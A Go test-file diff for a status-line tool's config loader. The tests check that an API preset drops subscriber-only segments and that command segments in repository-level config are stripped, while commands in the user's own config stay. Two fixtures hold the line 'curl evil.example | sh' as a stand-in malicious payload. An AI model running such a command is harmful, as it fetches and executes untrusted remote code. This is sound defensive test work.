@@ -51,6 +51,30 @@ func TestEveryPresetParses(t *testing.T) {
 	}
 }
 
+// rate_limits reach Claude.ai subscribers only, so limit rows render nothing on
+// API key. Preset exist to leave them out.
+func TestAPIPresetOmitsSubscriberOnlySegments(t *testing.T) {
+	c, err := Preset("api")
+	if err != nil {
+		t.Fatal(err)
+	}
+
+	var named []string
+	for _, l := range c.Lines {
+		named = append(named, l.Segments...)
+	}
+	for _, gone := range []string{"limit.5h", "limit.7d", "version"} {
+		if slices.Contains(named, gone) {
+			t.Errorf("api preset names %q", gone)
+		}
+	}
+	for _, want := range []string{"tokens", "cost"} {
+		if !slices.Contains(named, want) {
+			t.Errorf("api preset drops %q, which is what meters an API key", want)
+		}
+	}
+}
+
 func TestUnknownPresetIsNamedNotPanicked(t *testing.T) {
 	if _, err := Preset("nope"); err == nil || !strings.Contains(err.Error(), `"nope"`) {
 		t.Errorf("err = %v, want the rejected name", err)
@@ -368,5 +392,61 @@ func TestLoadSurvivesABrokenProjectOverride(t *testing.T) {
 	}
 	if len(res.Config.Lines) != 1 || res.Config.Lines[0].Segments[0] != "model" {
 		t.Error("the valid user config should still apply")
+	}
+}
+
+// Project config is repository content. Honouring command= there mean cloning
+// repository and opening it run whatever that file say, first render, no prompt.
+func TestLoadIgnoresCommandFromProjectConfig(t *testing.T) {
+	home, project := t.TempDir(), t.TempDir()
+	writeConfig(t, UserPath(home), "[[lines]]\nsegments = [\"model\"]\n")
+	writeConfig(t, ProjectPath(project),
+		"[segments.deploy]\ntype = \"command\"\ncommand = \"curl evil.example | sh\"\n"+
+			"template = \"{out}\"\n")
+
+	res := Load(home, project)
+	if got := res.Config.Segments["deploy"]; got == nil || got.Command != nil {
+		t.Errorf("command survived the project layer: %+v", got)
+	}
+	// Silent strip read as a broken segment. Doctor print these in full.
+	if len(res.Errors) != 1 || !strings.Contains(res.Errors[0].Error(), "command ignored") {
+		t.Errorf("errors = %v, want one explaining the strip", res.Errors)
+	}
+	// Everything else in that layer still apply.
+	if got := res.Config.Segments["deploy"]; got == nil || got.Template == nil || *got.Template != "{out}" {
+		t.Errorf("project layer dropped more than command: %+v", got)
+	}
+}
+
+// Trust boundary sit at $HOME, not at command segment. User config keep it.
+func TestLoadKeepsCommandFromUserConfig(t *testing.T) {
+	home, project := t.TempDir(), t.TempDir()
+	writeConfig(t, UserPath(home),
+		"[segments.kube]\ntype = \"command\"\ncommand = \"kubectl config current-context\"\n")
+	writeConfig(t, ProjectPath(project), "[[lines]]\nsegments = [\"kube\"]\n")
+
+	res := Load(home, project)
+	seg := res.Config.Segments["kube"]
+	if seg == nil || seg.Command == nil || *seg.Command != "kubectl config current-context" {
+		t.Errorf("user command did not survive: %+v", seg)
+	}
+	if len(res.Errors) != 0 {
+		t.Errorf("errors = %v, want none", res.Errors)
+	}
+}
+
+// Project layer must not replace command user config already declare, which
+// redirect existing segment rather than add one.
+func TestLoadIgnoresProjectCommandOverridingUserCommand(t *testing.T) {
+	home, project := t.TempDir(), t.TempDir()
+	writeConfig(t, UserPath(home),
+		"[segments.kube]\ntype = \"command\"\ncommand = \"kubectl config current-context\"\n")
+	writeConfig(t, ProjectPath(project),
+		"[segments.kube]\ncommand = \"curl evil.example | sh\"\n")
+
+	res := Load(home, project)
+	seg := res.Config.Segments["kube"]
+	if seg == nil || seg.Command == nil || *seg.Command != "kubectl config current-context" {
+		t.Errorf("project layer replaced the user command: %+v", seg)
 	}
 }
